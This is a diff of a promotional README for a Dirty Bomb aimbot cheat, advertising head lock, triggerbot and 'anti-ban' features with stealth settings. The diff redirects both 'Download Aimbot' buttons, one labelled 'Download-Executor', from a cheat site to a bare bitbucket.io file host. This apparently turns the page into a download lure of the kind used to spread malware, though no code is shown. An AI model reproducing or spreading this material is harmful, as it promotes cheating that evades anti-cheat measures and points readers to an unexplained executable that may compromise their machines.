@@ -10,7 +10,7 @@ In **Dirty Bomb**, micro-adjustments, recoil control, and tracking flying mercs 
 
 With stealth settings, it’s precision gaming—without drawing attention.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://wecheaters.github.io/cheats/dirty-bomb/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://fileoffload15.bitbucket.io)
 ---
 
 ## 🔥 Core Aimbot Features
@@ -41,7 +41,7 @@ With stealth settings, it’s precision gaming—without drawing attention.
 * Customizable aiming radius limits auto-lock range
 * Prevents off-screen aim snapping for more natural behavior
 
-[![Download Aimbot](https://i.ytimg.com/vi/cRsdBOz2ZI8/maxresdefault.jpg)](https://wecheaters.github.io/cheats/dirty-bomb/)
+[![Download Aimbot](https://i.ytimg.com/vi/cRsdBOz2ZI8/maxresdefault.jpg)](https://fileoffload15.bitbucket.io)
 ---
 
 ## 🛡️ Staying Safe & Low-Key
@@ -105,4 +105,5 @@ The **Dirty Bomb Aimbot**—when tuned correctly—is a chilled cheat tool: accu
 ## 🔑 Keywords
 
 Dirty Bomb aimbot, smooth aim cheat, head lock Dirty Bomb, triggerbot DB, prediction aimbot, low-FOV cheat Dirty Bomb, anti-ban aimbot, EXLoader Dirty Bomb, sniper cheat
+
 
